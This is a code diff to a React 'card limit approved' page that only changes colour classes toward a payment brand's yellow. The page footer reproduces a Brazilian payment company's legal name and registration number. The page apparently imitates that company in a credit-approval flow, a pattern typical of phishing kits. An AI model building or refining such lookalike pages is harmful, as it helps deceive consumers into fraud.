@@ -53,7 +53,7 @@ function Aprovado() {
 
       {/* Decorative circles */}
       <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
-      <div className="absolute w-56 h-56 rounded-full bg-[#3483FA]/10 -bottom-16 -left-16 z-0" />
+      <div className="absolute w-56 h-56 rounded-full bg-[#FFE600]/10 -bottom-16 -left-16 z-0" />
 
       <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
         <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
@@ -64,7 +64,7 @@ function Aprovado() {
             Agora é só finalizar seu cartão e começar a aproveitar
           </p>
 
-          <div className="rounded-xl bg-gradient-to-br from-[#3483FA] to-[#1E5BBA] text-white p-5 mb-6 text-center shadow-md">
+          <div className="rounded-xl bg-gradient-to-br from-[#FFE600] to-[#1E5BBA] text-white p-5 mb-6 text-center shadow-md">
             <p className="text-[11px] uppercase tracking-wider opacity-90">Limite aprovado</p>
             <p className="text-3xl font-extrabold mt-1 tabular-nums">
               R$ {limite.toLocaleString("pt-BR")},00
@@ -88,7 +88,7 @@ function Aprovado() {
 
           <button
             onClick={() => navigate({ to: "/limite" })}
-            className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md transition-all"
+            className="w-full bg-[#FFE600] hover:bg-[#E6CF00] text-white text-lg font-semibold py-4 rounded-md transition-all"
           >
             Continuar
           </button>
@@ -99,8 +99,8 @@ function Aprovado() {
         <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
         <p className="mt-1">
           CNPJ: 10.573.521/0001-91 ·{" "}
-          <a href="#" className="text-[#3483FA]">Termos e condições</a> ·{" "}
-          <a href="#" className="text-[#3483FA]">Privacidade</a>
+          <a href="#" className="text-gray-900">Termos e condições</a> ·{" "}
+          <a href="#" className="text-gray-900">Privacidade</a>
         </p>
       </footer>
     </div>
